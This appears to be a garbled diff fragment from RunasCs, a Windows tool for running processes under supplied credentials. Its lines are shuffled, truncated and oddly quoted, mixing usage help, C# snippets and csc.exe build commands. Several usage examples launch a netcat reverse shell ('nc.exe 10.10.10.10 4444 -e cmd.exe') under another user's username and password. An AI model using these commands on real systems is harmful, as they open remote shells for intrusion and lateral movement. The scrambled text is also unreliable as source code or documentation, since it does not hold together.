@@ -1,0 +1,19 @@
+            PS>Invoke-RunasCs -Username user1 -Password password1 -Command cmd.exe
+            Run a command simulating the /netonly flag of runas.exe
+        RunasCs.exe
+        RunasCs.exe user1 password1 cmd.exe
+    Run a command simulating the /netonly flag of runas.exe
+    RunasCs.exe
+    by specifying explicit credentials. In contrast to the default runas.exe
+ 10.10.10.10 4444 -e cmd.exe
+"         PS>Invoke-RunasCs -Username user1 -Password password1 -ProcessTimeout 0 -Command ""C:\tmp\nc.exe"
+"        // this will solve some issues, e.g. Access Denied errors when running whoami.exe"
+"        RunasCs.exe user1 password1 """"C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe"
+"        RunasCs.exe user1 password1 ""C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe"
+"        if (args[0].ToLower() == ""cmd"" || args[0].ToLower() == ""cmd.exe"
+"        if (args[0].ToLower() == ""powershell"" || args[0].ToLower() == ""powershell.exe"
+"$Filename = (Get-Location).Path + ""\RunasCs_net2.exe"
+"gs[0] = Environment.GetEnvironmentVariable(""WINDIR"") + @""\System32\WindowsPowerShell\v1.0\powershell.exe"
+C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe -target:exe -optimize -out:RunasCs_net2.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe
+This tool is an improved and open version of windows builtin *runas.exe
